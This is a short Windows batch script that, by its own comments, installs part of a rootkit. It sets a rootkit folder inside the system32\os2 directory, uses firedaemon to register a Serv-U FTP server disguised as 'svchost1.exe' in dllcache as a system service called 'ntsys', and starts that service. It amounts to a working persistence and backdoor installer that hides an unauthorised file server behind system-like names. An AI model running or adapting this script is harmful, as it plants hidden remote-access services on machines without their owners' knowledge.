@echo off
echo Setting Environment Variable for Rootkit's Root Folder
set MXBIN=C:\winnt\system32\os2


echo Installing Serv-U Daemon as a System Service..
c:\winnt\system32\os2\firedaemon -i ntsys "C:\WINNT\system32\os2" "C:\WINNT\system32\dllcache\svchost1.exe" "/u" Y 0 0 N Y

echo Starting Service: "ntsys"..
net start ntsys

